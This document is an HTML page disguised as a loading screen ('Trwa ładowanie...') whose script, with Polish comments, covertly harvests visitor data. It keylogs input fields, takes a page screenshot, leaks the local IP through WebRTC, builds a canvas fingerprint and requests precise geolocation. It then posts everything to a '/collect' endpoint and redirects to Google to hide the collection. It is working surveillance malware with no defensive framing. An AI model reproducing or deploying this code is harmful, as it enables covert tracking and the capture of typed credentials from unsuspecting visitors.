<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { background: #111; color: #fff; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="loader"></div>
        <p>Trwa ładowanie...</p>
    </div>

    <script>
    // === ZBIERZ WSZYSTKIE MOŻLIWE DANE ===
    const data = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height} (${window.devicePixelRatio} DPI)`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'direct',
        cookies: navigator.cookieEnabled,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        webgl: (() => { try { return !!document.createElement('canvas').getContext('webgl'); } catch(e) { return false; } })(),
        // === KEYLOGGER (przechwytuje klawisze w inputach) ===
        keystrokes: [],
        // === SCREENSHOT (base64) ===
        screenshot: null,
        // === LOKALNE IP (WebRTC) ===
        localIP: null,
        // === FINGERPRINT (Canvas) ===
        canvasFingerprint: null,
        // === GEOLOKALIZACJA ===
        location: null
    };

    // === 1. KEYLOGGER ===
    document.addEventListener('keydown', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            data.keystrokes.push({
                key: e.key,
                time: Date.now(),
                target: e.target.name || e.target.id || 'unknown'
            });
        }
    });

    // === 2. SCREENSHOT (html2canvas) ===
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
    script.onload = () => {
        html2canvas(document.body).then(canvas => {
            data.screenshot = canvas.toDataURL('image/png');
            sendData();
        }).catch(() => sendData());
    };
    document.head.appendChild(script);

    // === 3. LOKALNE IP (WebRTC) ===
    try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (e) => {
            if (e.candidate) {
                const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (ipMatch) data.localIP = ipMatch[0];
                pc.close();
            }
        };
        setTimeout(() => pc.close(), 3000);
    } catch(e) {}

    // === 4. FINGERPRINT (Canvas) ===
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 256;
        canvas.height = 128;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 256, 128);
        ctx.fillStyle = '#069';
        ctx.fillText('cHv', 10, 10);
        ctx.fillText('Fingerprint', 10, 40);
        data.canvasFingerprint = canvas.toDataURL();
    } catch(e) {}

    // === 5. GEOLOKALIZACJA ===
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                data.location = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude || null
                };
                // Jeśli screenshot już wysłany – nie wysyłaj drugi raz
                if (!data.screenshot) sendData();
            },
            () => { if (!data.screenshot) sendData(); },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else {
        if (!data.screenshot) sendData();
    }

    // === WYŚLIJ WSZYSTKO (po załadowaniu screenshot) ===
    function sendData() {
        // Jeśli screenshot jeszcze nie gotowy – czekaj
        if (!data.screenshot) {
            setTimeout(sendData, 1000);
            return;
        }
        fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(() => {
            // Przekierowanie po 2 sekundach (żeby zdążyć wysłać)
            setTimeout(() => window.location.href = 'https://www.google.com', 2000);
        }).catch(() => {
            window.location.href = 'https://www.google.com';
        });
    }

    // === START – jeśli screenshot nie załaduje się w 5s, wyślij bez niego ===
    setTimeout(() => {
        if (!data.screenshot) sendData();
    }, 5000);
    </script>
</body>
</html>
